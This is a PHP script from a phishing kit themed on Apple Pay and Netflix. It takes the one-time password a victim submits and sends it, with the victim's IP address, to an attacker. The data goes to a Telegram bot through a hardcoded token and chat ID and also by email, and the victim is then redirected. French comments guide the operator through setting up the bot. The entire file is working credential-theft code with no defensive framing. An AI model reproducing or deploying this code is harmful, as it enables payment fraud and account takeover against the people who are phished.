<?php
  error_reporting(0);
  ob_start();
  session_start();
include '../../anti3.php';
include '../../email.php';
include '../../nword.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
  $_SESSION['otp']  = $_POST['otp'];
header('location: ../merci.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
$zizi = urlencode("ㅤ\n [📱] Apple Pay [📱] \n ㅤ\n ✔️ Apple Pay : ".$_SESSION['otp']."\n 🗑 Adresse IP : "._ip()."\n ㅤ");
	$grouparobaz = urlencode("-673661159"); // apres avoir inviter ton bot dans le groupe met le @ du groupe ou tu veux recevoir les notif
	$apitoken = urlencode("5201302943:AAHrCbCirUk1melvbCXxq_x-Hq5Ix2hbTM4"); // Le token de ton bot que @BotFather te donne
    $html = file_get_contents('https://api.telegram.org/bot'.$apitoken.'/sendMessage?chat_id='.$grouparobaz.'&text='.$zizi.''); // ne pas toucher
	
$message = "
          
 ㅤ
[📱] Apple Pay [📱]

✔️ Apple Pay : ".$_SESSION['otp']."
🗑 Adresse IP : "._ip()."

          ";
	
$Subject=" 「📱」+1 VBV Apple Pay From "._ip()."|🎯 ";
$head="From: (っ◔◡◔)っ ❤ TYNOX N3TFLIX 🍓 <cc@sdf.cash>";
mail($my_mail,$Subject,$message,$head);


}
else
{
  header('location: ../../login.php');
}

?>
